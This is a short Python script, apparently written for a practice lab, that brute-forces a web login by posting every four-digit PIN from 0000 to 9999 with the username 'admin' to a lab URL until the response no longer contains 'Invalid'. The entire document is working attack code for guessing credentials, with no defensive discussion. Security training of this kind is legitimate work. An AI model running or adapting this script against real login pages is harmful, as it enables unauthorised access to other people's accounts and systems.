"""
Brute-force script for numeric passwords (0000–9999).

- Uses zfill() to ensure fixed-length passwords
- Automates login attempts using POST requests
"""
import requests

# -- target configuration
url = "http://10.81.184.8/labs/lab1/"
username = "admin"

# -- generate 4-digit numeric passwords (0000–9999)
# -- convert number → string then pad with zeros
password_list = [str(i).zfill(4) for i in range(10000)]


def brute_force():
    # loop through all generated passwords
    for password in password_list:

        # prepare login request
        data = {
            "username": username,
            "password": password
        }

        response = requests.post(url, data=data)

        # check if login is successful
        if "Invalid" not in response.text:
            print(f"[+] Found valid credentials: {username}:{password}")
            break
        else:
            print(f"[-] Attempted: {password}")


if __name__ == "__main__":
    brute_force()